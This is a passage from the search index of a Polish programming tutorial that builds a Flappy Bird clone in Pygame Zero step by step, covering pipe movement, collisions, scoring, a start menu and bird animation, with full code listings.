random.randint(200, 500)\n\n    pipe_top.x = WIDTH\n    pipe_top.y = gap_y - GAP_SIZE / 2\n\n    pipe_bottom.x = WIDTH\n    pipe_bottom.y = gap_y + GAP_SIZE / 2\n</code></pre> <p>Teraz czas wywo\u0142a\u0107 nasz\u0105 funkcj\u0119. Zrobimy to zaraz przed uruchomieniem gry, czyli tu\u017c przed instrukcj\u0105 <code>pgzrun.go()</code>.</p> <pre><code>set_pipes()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#przemieszczamy-rury","title":"Przemieszczamy rury","text":"<p>W ka\u017cdej klatce animacji nasze rury powinny przemieszcza\u0107 si\u0119 w lew\u0105 stron\u0119. Z jak\u0105 pr\u0119dko\u015bci\u0105 powinny si\u0119 porusza\u0107? To tak\u017ce mo\u017cemy zapisa\u0107 jako ustawienie naszej gry. Utw\u00f3rzmy wi\u0119c zmienn\u0105 SPEED, kt\u00f3r\u0105 zapiszemy zaraz pod ustawieniem rozmiaru przerwy. Nadajmy jej pocz\u0105tkow\u0105 warto\u015b\u0107 \\(3\\).</p> <pre><code>SPEED = 3\n</code></pre> <p>Teraz mo\u017cemy przej\u015b\u0107 do aktualizacji pozycji rur na ekranie zgodnie z ustalon\u0105 pr\u0119dko\u015bci\u0105. W tym celu utworzymy now\u0105 pomocnicz\u0105 funkcj\u0119 update_pipes, tak by zachowa\u0107 porz\u0105dek i czytelno\u015b\u0107 naszego kodu. Funkcj\u0119 zapiszemy zaraz pod funkcj\u0105 aktualizuj\u0105c\u0105 ptaka (update_bird).</p> <pre><code>def update_pipes():\n</code></pre> <p>Wewn\u0105trz naszej funkcji przesuwamy rury zgodnie z ustalon\u0105 pr\u0119dko\u015bci\u0105. Chcemy je przesun\u0105\u0107 w lewo, wi\u0119c od ich wsp\u00f3\u0142rz\u0119dnej x odejmujemy nasz\u0105 pr\u0119dko\u015b\u0107 SPEED.</p> <pre><code>def update_pipes():\n    pipe_top.x -= SPEED\n    pipe_bottom.x -= SPEED\n</code></pre> <p>Gdy rury znikn\u0105 z lewej strony ekranu, nale\u017cy ustawi\u0107 je ponownie. Aby sprawdzi\u0107 czy znikn\u0119\u0142y, mo\u017cemy sprawdzi\u0107, czy wsp\u00f3\u0142rz\u0119dna x g\u00f3rnej (lub dolnej) rury jest odpowiednio ma\u0142a, np. mniejsza od \\(-100\\), tak aby mie\u0107 pewno\u015b\u0107, \u017ce rura ca\u0142kowicie znikn\u0119\u0142a z ekranu.</p> <pre><code>def update_pipes():\n    pipe_top.x -= SPEED\n    pipe_bottom.x -= SPEED\n\n    if pipe_top.x &lt; -100:\n</code></pre> <p>Teraz pozosta\u0142o wywo\u0142a\u0107 nasz\u0105 pomocnicz\u0105 funkcj\u0119 ustawiaj\u0105c\u0105 rury (set_pipes).</p> <pre><code>def update_pipes():\n    pipe_top.x -= SPEED\n    pipe_bottom.x -= SPEED\n\n    if pipe_top.x &lt; -100:\n        set_pipes()\n</code></pre> <p>Nasza funkcja jest ju\u017c gotowa, wi\u0119c dopiszmy jej wywo\u0142anie na ko\u0144cu funkcji update.</p> <pre><code>def update():\n    ...\n\n    update_pipes()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#peny-kod_1","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 400\nHEIGHT = 700\n\nTITLE = \"Pygame Zero Flappy Bird\"\n\nGRAVITY = 0.3\nFLAP = 7\nGAP_SIZE = 180\nSPEED = 3\n\nbird = Actor(\"bird1\")\nbird.x = 75\nbird.y = 200\nbird.vy = 0\n\n# Tworzymy g\u00f3rn\u0105 rur\u0119\npipe_top = Actor(\"top\")\npipe_top.anchor = (\"left\", \"bottom\")\n\n# Tworzymy doln\u0105 rur\u0119\npipe_bottom = Actor(\"bottom\")\npipe_bottom.anchor = (\"left\", \"top\")\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    # Rysujemy g\u00f3rn\u0105 rur\u0119\n    pipe_top.draw()\n    # Rysujemy doln\u0105 rur\u0119\n    pipe_bottom.draw()\n    bird.draw()\n\ndef update():\n    update_bird()\n    # Aktualizujemy rury\n    update_pipes()\n\ndef update_bird():\n    bird.vy += GRAVITY\n    bird.y += bird.vy\n\n# Pomocnicza funkcja aktualizuj\u0105ca rury\ndef update_pipes():\n    # Przemieszczamy g\u00f3rn\u0105 i doln\u0105 rur\u0119 zgodnie z pr\u0119dko\u015bci\u0105 przemieszczania si\u0119 rur\n    pipe_top.x -= SPEED\n    pipe_bottom.x -= SPEED\n\n    # Je\u017celi g\u00f3rna rura schowa\u0142a si\u0119 ju\u017c z lewej strony ekranu\n    if pipe_top.x &lt; -100:\n        # Ponownie ustawiamy rury\n        set_pipes()\n\ndef on_mouse_down(pos):\n    bird.vy = -FLAP\n    sounds.wing.play()\n\n# Pomocnicza funkcja ustawiaj\u0105ca rury\ndef set_pipes():\n    # Losujemy pozycj\u0119 \u015brodka przestrzeni pomi\u0119dzy rurami\n    gap_y = random.randint(200, 500)\n\n    # Ustawiamy pozycj\u0119 g\u00f3rnej rury\n    pipe_top.x = WIDTH\n    pipe_top.y = gap_y - GAP_SIZE / 2\n\n    # Ustawiamy pozycj\u0119 dolnej rury\n    pipe_bottom.x = WIDTH\n    pipe_bottom.y = gap_y + GAP_SIZE / 2\n\n# Ustawiamy rury na pocz\u0105tku gry\nset_pipes()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#koniec-gry","title":"Koniec gry","text":"<p>Kiedy nasza gra si\u0119 ko\u0144czy? Gdy trafimy w rur\u0119, lub wylecimy poza ekran.</p>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#reset-gry","title":"Reset gry","text":"<p>Zacznijmy od zastanowienia si\u0119, co chcemy zrobi\u0107, gdy gra si\u0119 sko\u0144czy, tzn. gdy gracz przegra. Mo\u017cemy oczywi\u015bcie wy\u015bwietli\u0107 komunikat o przegranej i wy\u0142\u0105czy\u0107 gr\u0119. Nasza gra ma jednak z za\u0142o\u017cenia wysoki poziom trudno\u015bci, wi\u0119c uruchamianie jej raz za razem po ka\u017cdej przegranej bardzo szybko sta\u0142oby si\u0119 uci\u0105\u017cliwe. Zamiast tego po przegranej zresetujemy gr\u0119, tzn. zaczniemy j\u0105 od nowa. W tym celu stworzymy now\u0105 funkcj\u0119 reset, kt\u00f3r\u0105 umie\u015bcimy na ko\u0144cu naszego kodu, zaraz przed instrukcj\u0105 <code>pgzrun.go()</code>.</p> <pre><code>def reset():\n</code></pre> <p>Co powinni\u015bmy zrobi\u0107, aby zresetowa\u0107 gr\u0119? Jakie jej ustawienia musimy przywr\u00f3ci\u0107 do pocz\u0105tkowych warto\u015bci? Potrzebujemy przywr\u00f3ci\u0107 naszego gracza, ptaka, na pocz\u0105tkow\u0105 pozycj\u0119 i nada\u0107 mu w\u0142a\u015bciw\u0105 pr\u0119dko\u015b\u0107.</p> <pre><code>def reset():\n    bird.x = 75\n    bird.y = 200\n    bird.vy = 0\n</code></pre> <p>Przyda\u0142oby si\u0119 tak\u017ce ponownie ustawi\u0107 rury, aby\u015bmy przypadkiem nie wyl\u0105dowali w \u015brodku jednej  z nich.</p> <pre><code>def reset():\n    bird.x = 75\n    bird.y = 200\n    bird.vy = 0\n    set_pipes()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#kolizja-z-rura","title":"Kolizja z rur\u0105","text":"<p>W jaki spos\u00f3b wykry\u0107, \u017ce ptak uderzy\u0142 w rur\u0119? Musimy sprawdzi\u0107, czy aktor reprezentuj\u0105cy ptaka i aktor reprezentuj\u0105cy rur\u0119 s\u0105 ze sob\u0105 w kolizji. Co to oznacza, \u017ce dwaj aktorzy s\u0105 ze sob\u0105 w kolizji? To znaczy, \u017ce prostok\u0105ty, kt\u00f3re reprezentuj\u0105 ich grafiki, nachodz\u0105 na siebie. Mo\u017cna to sprawdzi\u0107 na wiele sposob\u00f3w, ale biblioteka Pygame Zero ma do tego wbudowan\u0105 funkcj\u0119: colliderect.</p> <p>Kolizj\u0119 ptaka b\u0119dziemy sprawdza\u0107 w funkcji aktualizuj\u0105cej ptaka, czyli update_bird.</p> <p>W celu sprawdzenia, czy ptak jest w kolizji z g\u00f3rn\u0105 rur\u0105, zapiszemy:</p> <pre><code>def update_bird():\n    ...\n\n    if bird.colliderect(pipe_top):\n</code></pre> <p>Oczywi\u015bcie nie interesuje nas tylko uderzenie w g\u00f3rn\u0105 rur\u0119, ale tak\u017ce i w doln\u0105. W gruncie rzeczy ptak mo\u017ce zahaczy\u0107 o g\u00f3rn\u0105 rur\u0119 lub doln\u0105. Dodajmy wi\u0119c to do naszego warunku.</p> <pre><code>def update_bird():\n    ...\n\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom):\n</code></pre> <p>Co chcemy zrobi\u0107, gdy ptak uderzy w kt\u00f3r\u0105\u015b z rur? Najpierw odtw\u00f3rzmy d\u017awi\u0119k uderzenia: hit.</p> <pre><code>def update_bird():\n    ...\n\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom):\n        sounds.hit.play()\n</code></pre> <p>Chcemy tak\u017ce zresetowa\u0107 gr\u0119. Wywo\u0142ujemy wi\u0119c nasz\u0105 funkcj\u0119 reset.</p> <pre><code>def update_bird():\n    ...\n\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom):\n        sounds.hit.play()\n        reset()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#ucieczka-poza-ekran","title":"Ucieczka poza ekran","text":"<p>Gdy wylecimy ptakiem poza ekran, gra ma si\u0119 zako\u0144czy\u0107, tzn. zacz\u0105\u0107 od nowa, podobnie jak w przypadku uderzenia w rur\u0119. Co to znaczy, \u017ce nasz aktor przemie\u015bci\u0142 si\u0119 poza ekran? To znaczy, \u017ce jego wsp\u00f3\u0142rz\u0119dne znajduj\u0105 si\u0119 poza ekranem.</p> <p>Poniewa\u017c nasza posta\u0107 porusza si\u0119 jedynie g\u00f3ra-d\u00f3\u0142, ograniczymy si\u0119 do sprawdzenia, czy nie wylecieli\u015bmy z g\u00f3ry albo z do\u0142u ekranu. Je\u017celi wylecieli\u015bmy z g\u00f3ry ekranu, to znaczy, \u017ce nasza wsp\u00f3\u0142rz\u0119dna \\(y\\) jest mniejsza od \\(0\\). Nasz warunek dopiszemy jako kolejn\u0105 opcj\u0119 przy sprawdzaniu kolizji z rurami, poniewa\u017c w obu przypadkach zareagujemy tak samo.</p> <pre><code>def update_bird():\n    ...\n\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom) or bird.y &lt; 0:\n        sounds.hit.play()\n        reset()\n</code></pre> <p>Je\u017celi natomiast wylecieli\u015bmy z do\u0142u ekranu, to znaczy, \u017ce nasza wsp\u00f3\u0142rz\u0119dna \\(y\\) jest wi\u0119ksza od wysoko\u015bci (HEIGHT) ekranu.</p> <pre><code>def update_bird():\n    ...\n\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom) or bird.y &lt; 0 or bird.y &gt; HEIGHT:\n        sounds.hit.play()\n        reset()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#peny-kod_2","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 400\nHEIGHT = 700\n\nTITLE = \"Pygame Zero Flappy Bird\"\n\nGRAVITY = 0.3\nFLAP = 7\nGAP_SIZE = 180\nSPEED = 3\n\nbird = Actor(\"bird1\")\nbird.x = 75\nbird.y = 200\nbird.vy = 0\n\npipe_top = Actor(\"top\")\npipe_top.anchor = (\"left\", \"bottom\")\n\npipe_bottom = Actor(\"bottom\")\npipe_bottom.anchor = (\"left\", \"top\")\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pipe_top.draw()\n    pipe_bottom.draw()\n    bird.draw()\n\ndef update():\n    update_bird()\n    update_pipes()\n\ndef update_bird():\n    bird.vy += GRAVITY\n    bird.y += bird.vy\n\n    # Je\u017celi ptak wpad\u0142 na g\u00f3rn\u0105 lub doln\u0105 rur\u0119, lub gdy wylecia\u0142 poza ekran z do\u0142u lub z g\u00f3ry\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom) or bird.y &gt; HEIGHT or bird.y &lt; 0:\n        # Odtwarzamy d\u017awi\u0119k uderzenia\n        sounds.hit.play()\n        # Resetujemy gr\u0119\n        reset()\n\ndef update_pipes():\n    pipe_top.x -= SPEED\n    pipe_bottom.x -= SPEED\n\n    if pipe_top.x &lt; -100:\n        set_pipes()\n\ndef on_mouse_down(pos):\n    bird.vy = -FLAP\n    sounds.wing.play()\n\ndef set_pipes():\n    gap_y = random.randint(200, 500)\n\n    pipe_top.x = WIDTH\n    pipe_top.y = gap_y - GAP_SIZE / 2\n\n    pipe_bottom.x = WIDTH\n    pipe_bottom.y = gap_y + GAP_SIZE / 2\n\n# Pomocnicza funkcja resetuj\u0105ca stan gry\ndef reset():\n    # Ustalamy pocz\u0105tkow\u0105 pozycj\u0119 ptaka na ekranie\n    bird.x = 75\n    bird.y = 200\n    # Ustalamy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 pionow\u0105 ptaka\n    bird.vy = 0\n    # Ustawiamy rury\n    set_pipes()\n\nset_pipes()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#punkty","title":"Punkty","text":"<p>Czas na zdobywanie punkt\u00f3w!</p>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#zapamietujemy-punkty","title":"Zapami\u0119tujemy punkty","text":"<p>W celu zapami\u0119tania punkt\u00f3w dopiszemy now\u0105 zmienn\u0105 do naszego aktora ptaka. Nazwiemy j\u0105 points i przypiszemy jej pocz\u0105tkow\u0105 warto\u015b\u0107 \\(0\\). Now\u0105 zmienn\u0105 dopisujemy na g\u00f3rze kodu, zaraz pod przypisaniem pr\u0119dko\u015bci pionowej do ptaka.</p> <pre><code>bird = Actor(\"bird1\")\nbird.x = 75\nbird.y = 200\nbird.vy = 0\nbird.points = 0\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#wyswietlamy-punkty-na-ekranie","title":"Wy\u015bwietlamy punkty na ekranie","text":"<p>Na ko\u0144cu cz\u0119\u015bci rysuj\u0105cej dopiszemy wy\u015bwietlanie punkt\u00f3w za pomoc\u0105 funkcji <code>screen.draw.text</code>.</p> <pre><code>def draw():\n    ...\n\n    screen.draw.text(str(bird.points), center=(WIDTH / 2, 30), fontsize=70)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#zliczamy-punkty","title":"Zliczamy punkty","text":"<p>Punkty b\u0119dziemy dostawa\u0107 za ka\u017cd\u0105 pokonan\u0105 przeszkod\u0119. Dlatego, w funkcji aktualizuj\u0105cej rury (update_pipes), w miejscu gdzie ponownie ustawiamy rury, gdy te znikn\u0105 z ekranu, dodamy graczowi jeden punkt.</p> <pre><code>def update_pipes():\n    ...\n\n    if pipe_top.x &lt; -100:\n        set_pipes()\n        bird.points += 1\n</code></pre> <p>Po zdobyciu punktu warto tak\u017ce odtworzy\u0107 efekt d\u017awi\u0119kowy o nazwie point.</p> <pre><code>def update_pipes():\n    ...\n\n    if pipe_top.x &lt; -100:\n        set_pipes()\n        bird.points += 1\n        sounds.point.play()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#resetujemy-punkty","title":"Resetujemy punkty","text":"<p>Nie chcieliby\u015bmy, \u017ceby gra kontynuowa\u0142a zliczanie punkt\u00f3w po przegranej, tylko \u017ceby punkty by\u0142y liczone od nowa. W tym celu, w funkcji resetuj\u0105cej gr\u0119 (reset) dopiszemy wyzerowanie punkt\u00f3w gracza. W celu zachowania porz\u0105dku kodu dopiszemy to zaraz przed wywo\u0142aniem funkcji set_pipes, chocia\u017c kolejno\u015b\u0107 nie b\u0119dzie mia\u0142a wp\u0142ywu na dzia\u0142anie gry.</p> <pre><code>def reset():\n    ...\n\n    bird.points = 0\n    set_pipes()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#peny-kod_3","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 400\nHEIGHT = 700\n\nTITLE = \"Pygame Zero Flappy Bird\"\n\nGRAVITY = 0.3\nFLAP = 7\nGAP_SIZE = 180\nSPEED = 3\n\nbird = Actor(\"bird1\")\nbird.x = 75\nbird.y = 200\nbird.vy = 0\n# Zliczamy zdobyte przez gracza punkty\nbird.points = 0\n\npipe_top = Actor(\"top\")\npipe_top.anchor = (\"left\", \"bottom\")\n\npipe_bottom = Actor(\"bottom\")\npipe_bottom.anchor = (\"left\", \"top\")\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pipe_top.draw()\n    pipe_bottom.draw()\n    bird.draw()\n    # Wypisujemy liczb\u0119 punkt\u00f3w na ekranie\n    screen.draw.text(str(bird.points), center=(WIDTH / 2, 30), fontsize=70)\n\ndef update():\n    update_bird()\n    update_pipes()\n\ndef update_bird():\n    bird.vy += GRAVITY\n    bird.y += bird.vy\n\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom) or bird.y &gt; HEIGHT or bird.y &lt; 0:\n        sounds.hit.play()\n        reset()\n\ndef update_pipes():\n    pipe_top.x -= SPEED\n    pipe_bottom.x -= SPEED\n\n    if pipe_top.x &lt; -100:\n        set_pipes()\n        # Zwi\u0119kszamy liczb\u0119 punkt\u00f3w\n        bird.points += 1\n        # Odtwarzamy d\u017awi\u0119k zdobycia punktu\n        sounds.point.play()\n\ndef on_mouse_down(pos):\n    bird.vy = -FLAP\n    sounds.wing.play()\n\ndef set_pipes():\n    gap_y = random.randint(200, 500)\n\n    pipe_top.x = WIDTH\n    pipe_top.y = gap_y - GAP_SIZE / 2\n\n    pipe_bottom.x = WIDTH\n    pipe_bottom.y = gap_y + GAP_SIZE / 2\n\ndef reset():\n    bird.x = 75\n    bird.y = 200\n    bird.vy = 0\n    # Zapami\u0119tujemy liczb\u0119 punkt\u00f3w zdobytych przez gracza\n    bird.points = 0\n    set_pipes()\n\nset_pipes()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#menu","title":"Menu","text":"<p>Przejd\u017amy teraz do kwestii obs\u0142ugi menu gry. Nasze menu b\u0119dzie proste, poniewa\u017c b\u0119dzie zawiera\u0142o tylko jeden przycisk do rozpocz\u0119cia gry.</p>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#tworzymy-przycisk","title":"Tworzymy przycisk","text":"<p>Nasz przycisk b\u0119dzie kolejnym aktorem, kt\u00f3rego utworzymy na podstawie grafiki start1.png i zapami\u0119tamy w nowej zmiennej start. Aktora utworzymy zaraz pod stworzeniem rur.</p> <pre><code>start = Actor(\"start1\")\n</code></pre> <p>Nasz przycisk umie\u015bcimy po\u015brodku ekranu, tzn. w po\u0142owie szeroko\u015bci i wysoko\u015bci. Przypisujemy mu wi\u0119c odpowiednie wsp\u00f3\u0142rz\u0119dne.</p> <pre><code>start = Actor(\"start1\")\nstart.x = WIDTH / 2\nstart.y = HEIGHT / 2\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#rysujemy-przycisk","title":"Rysujemy przycisk","text":"<p>Przycisk narysujemy w\u00f3wczas, gdy gra si\u0119 zako\u0144czy. O zako\u0144czeniu gry poinformuje nas nowa zmienna bird.dead, kt\u00f3r\u0105 dopiszemy do naszego ptaka, zaraz pod punktami, i nadamy jej pocz\u0105tkow\u0105 warto\u015b\u0107 TRUE. </p> <pre><code>bird.dead = True\n</code></pre> <p>Je\u017celi ta zmienna ma warto\u015b\u0107 TRUE, to rysujemy przycisk na ko\u0144cu cz\u0119\u015bci rysuj\u0105cej.</p> <pre><code>def draw():\n    ...\n\n    if bird.dead:\n        start.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#klikamy-na-przycisk","title":"Klikamy na przycisk","text":"<p>C\u00f3\u017c to za przycisk, kt\u00f3ry nie reaguje na klikni\u0119cia? Interakcj\u0119 z przyciskiem obs\u0142u\u017cymy wewn\u0105trz funkcji odczytuj\u0105cej klikni\u0119cia myszy, czyli on_mouse_down. Najpierw jednak zmodyfikujmy nasz\u0105 funkcj\u0119, tak aby nie mo\u017cna by\u0142o lata\u0107 ptakiem, gdy gra si\u0119 ju\u017c zako\u0144czy\u0142a. W tym celu dwie instrukcje, kt\u00f3re mamy zapisane w tej funkcji, czyli podfruni\u0119cie i odtworzenie d\u017awi\u0119ku, wykonamy tylko wtedy, gdy gra nie jest (not) zako\u0144czona.</p> <pre><code>def on_mouse_down(pos):\n    if not bird.dead:\n        bird.vy = -FLAP\n        sounds.wing.play()\n</code></pre> <p>W przeciwnym przypadku je\u017celi (elif) pozycja klikni\u0119cia myszy (pos) jest w kolizji z przyciskiem start: <code>start.collidepoint(pos)</code>. Je\u017celi tak, to zresetujemy gr\u0119 wywo\u0142uj\u0105c nasz\u0105 funkcj\u0119 reset.</p> <pre><code>def on_mouse_down(pos):\n    if not bird.dead:\n        bird.vy = -FLAP\n        sounds.wing.play()\n    elif start.collidepoint(pos):\n        reset()\n</code></pre> <p>Teraz jeszcze jednak nasza gra nie wystartuje poprawnie, poniewa\u017c nie zmieniamy warto\u015bci zmiennej bird.dead, w zwi\u0105zku z czym dla programu gra jest ca\u0142y czas zako\u0144czona. Dlatego do naszej funkcji reset dopisujemy zmian\u0119 warto\u015bci wspomnianej zmiennej na FALSE. Dla zachowania porz\u0105dku dopiszemy to zaraz pod wyzerowaniem liczby punkt\u00f3w, a przed ponownym ustawieniem rur.</p> <pre><code>def reset():\n    ...\n\n    bird.dead = False\n    set_pipes()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#konczymy-gre-po-kolizji","title":"Ko\u0144czymy gr\u0119 po kolizji","text":"<p>Teraz nasze menu powinno ju\u017c dzia\u0142a\u0107, gdy uruchomimy gr\u0119. Gdy jednak uderzymy w przeszkod\u0119, to gra si\u0119 po prostu zrestartuje. Zmie\u0144my to! Je\u017celi uderzymy w przeszkod\u0119, co sprawdzamy na ko\u0144cu funkcji update_bird, to nie b\u0119dziemy resetowa\u0107 gry, tylko zmienimy warto\u015b\u0107 zmiennej na bird.dead na TRUE.</p> <pre><code>def update_bird():\n    ...\n\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom) or bird.y &gt; HEIGHT or bird.y &lt; 0:\n        sounds.hit.play()\n        bird.dead = True\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#zatrzymujemy-rury","title":"Zatrzymujemy rury","text":"<p>Przyda\u0142oby si\u0119 tak\u017ce zatrzyma\u0107 rury, gdy gra si\u0119 zako\u0144czy, tak by\u015bmy nie mogli nabija\u0107 punkt\u00f3w w niesko\u0144czono\u015b\u0107! W tym celu, na pocz\u0105tku funkcji update_pipes sprawdzimy, czy gra si\u0119 ju\u017c zako\u0144czy\u0142a. Je\u017celi tak, to wyjdziemy z funkcji bez aktualizacji pozycji rur korzystaj\u0105c z polecenia return.</p> <pre><code>def update_pipes():\n    if bird.dead:\n        return\n\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#peny-kod_4","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 400\nHEIGHT = 700\n\nTITLE = \"Pygame Zero Flappy Bird\"\n\nGRAVITY = 0.3\nFLAP = 7\nGAP_SIZE = 180\nSPEED = 3\n\nbird = Actor(\"bird1\")\nbird.x = 75\nbird.y = 200\nbird.vy = 0\nbird.points = 0\n# Zapami\u0119tujemy, czy gra si\u0119 zako\u0144czy\u0142a\nbird.dead = True\n\npipe_top = Actor(\"top\")\npipe_top.anchor = (\"left\", \"bottom\")\n\npipe_bottom = Actor(\"bottom\")\npipe_bottom.anchor = (\"left\", \"top\")\n\n# Tworzymy przycisk startu\nstart = Actor(\"start1\")\n# Ustalamy pozycj\u0119 przycisku na ekranie\nstart.x = WIDTH / 2\nstart.y = HEIGHT / 2\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pipe_top.draw()\n    pipe_bottom.draw()\n    bird.draw()\n    screen.draw.text(str(bird.points), center=(WIDTH / 2, 30), fontsize=70)\n    # Je\u017celi gra si\u0119 zako\u0144czy\u0142a\n    if bird.dead:\n        # Rysujemy przycisk startu gry\n        start.draw()\n\ndef update():\n    update_bird()\n    update_pipes()\n\ndef update_bird():\n    bird.vy += GRAVITY\n    bird.y += bird.vy\n\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom) or bird.y &gt; HEIGHT or bird.y &lt; 0:\n        sounds.hit.play()\n        # Zapami\u0119tujemy, \u017ce gra si\u0119 zako\u0144czy\u0142a\n        bird.dead = True\n\ndef update_pipes():\n    # Je\u017celi gra si\u0119 zako\u0144czy\u0142a\n    if bird.dead:\n        # Ko\u0144czymy i nie przeprowadzamy ju\u017c dalszej aktualizacji ptaka\n        return\n\n    pipe_top.x -= SPEED\n    pipe_bottom.x -= SPEED\n\n    if pipe_top.x &lt; -100:\n        set_pipes()\n        bird.points += 1\n        sounds.point.play()\n\ndef on_mouse_down(pos):\n    # Je\u017celi gra jeszcze trwa\n    if not bird.dead:\n        bird.vy = -FLAP\n        sounds.wing.play()\n    elif start.collidepoint(pos): # W przeciwnym przypadku, gdy klikn\u0119li\u015bmy na przycisk start i gra jest ju\u017c zako\u0144czona\n        # Resetujemy stan gry\n        reset() \n\ndef set_pipes():\n    gap_y = random.randint(200, 500)\n\n    pipe_top.x = WIDTH\n    pipe_top.y = gap_y - GAP_SIZE / 2\n\n    pipe_bottom.x = WIDTH\n    pipe_bottom.y = gap_y + GAP_SIZE / 2\n\ndef reset():\n    bird.x = 75\n    bird.y = 200\n    bird.vy = 0\n    bird.points = 0\n    # Zapami\u0119tujemy, czy gra si\u0119 ju\u017c zako\u0144czy\u0142a\n    bird.dead = False\n    set_pipes()\n\nset_pipes()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#efekty-wizualne","title":"Efekty wizualne","text":"<p>Pora na ostatnie szlify. Teraz dodamy kilka efekt\u00f3w wizualnych, takich jak obr\u00f3t ptaka, zmiana jego grafiki, czy te\u017c efekt najechania wska\u017anikiem myszki na przycisk.</p>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#efekt-spadania-po-kolizji","title":"Efekt spadania po kolizji","text":"<p>Po kolizji ptaka z przeszkod\u0105 zmienimy jego grafik\u0119 (bird.image) na dead, a tak\u017ce ustawimy mu k\u0105t obrotu (bird.angle) na \\(-90\\), tak aby by\u0142 skierowany w d\u00f3\u0142.</p> <pre><code>def update_bird():\n    ...\n\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom) or bird.y &gt; HEIGHT or bird.y &lt; 0:\n        sounds.hit.play()\n        bird.dead = True\n        bird.image = \"dead\"\n        bird.angle = -90\n</code></pre> <p>Teraz jeszcze powinni\u015bmy przywr\u00f3ci\u0107 w\u0142a\u015bciw\u0105 grafik\u0119 ptaka gdy restartujemy gr\u0119, aby nie mie\u0107 lataj\u0105cego ptaka zombie. Dlatego w funkcji reset, zaraz pod zmian\u0105 warto\u015bci zmiennej bird.dead, zmienimy grafik\u0119 ptaka na pocz\u0105tkow\u0105, czyli bird1.</p> <pre><code>def reset():\n    ...\n\n    bird.image = \"bird1\"\n    set_pipes()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#obracanie-ptaka-i-machanie-skrzydekami","title":"Obracanie ptaka i machanie skrzyde\u0142kami","text":"<p>Obrotem ptaka i zmian\u0105 jego grafiki tak, by ptak \"macha\u0142\" skrzyde\u0142kami, zajmiemy si\u0119 na ko\u0144cu funkcji aktualizuj\u0105cej ptaka (update_bird). Poniewa\u017c ptaka chcemy obraca\u0107 tylko wtedy, gdy gra si\u0119 jeszcze nie zako\u0144czy\u0142a (poniewa\u017c gdy gra jest zako\u0144czona, to ptak spada w d\u00f3\u0142), to najpierw sprawdzimy, czy nieprawda \u017ce (not) gra jest zako\u0144czona (bird.dead).</p> <pre><code>def update_bird():\n    ...\n\n    if not bird.dead:\n</code></pre> <p>Teraz przysz\u0142a pora na zaj\u0119cie si\u0119 obrotem ptaka i zmian\u0105 jego grafik. Te dwie rzeczy uzale\u017cnimy od jego pr\u0119dko\u015bci, a konkretnie od tego, czy leci do g\u00f3ry, czy spada w d\u00f3\u0142.</p> <p>Je\u017celi pr\u0119dko\u015b\u0107 pionowa ptaka jest mniejsza od zera, oznacza to, \u017ce ptak wzlatuje do g\u00f3ry. W takim razie zmienimy jego grafik\u0119 na bird2, a obr\u00f3t zwi\u0119kszymy o \\(3\\), by obr\u00f3ci\u0142 si\u0119 do g\u00f3ry.</p> <pre><code>def update_bird():\n    ...\n\n    if not bird.dead:\n        if bird.vy &lt; 0:\n            bird.image = \"bird2\"\n            bird.angle += 3\n</code></pre> <p>W przeciwnym przypadku, tzn. gdy ptak spada w d\u00f3\u0142, zmienimy jego grafik\u0119 na bird1 i zmiejszymy jego k\u0105t obrotu o \\(3\\), by obr\u00f3ci\u0142 si\u0119 do do\u0142u.</p> <pre><code>def update_bird():\n    ...\n\n    if not bird.dead:\n        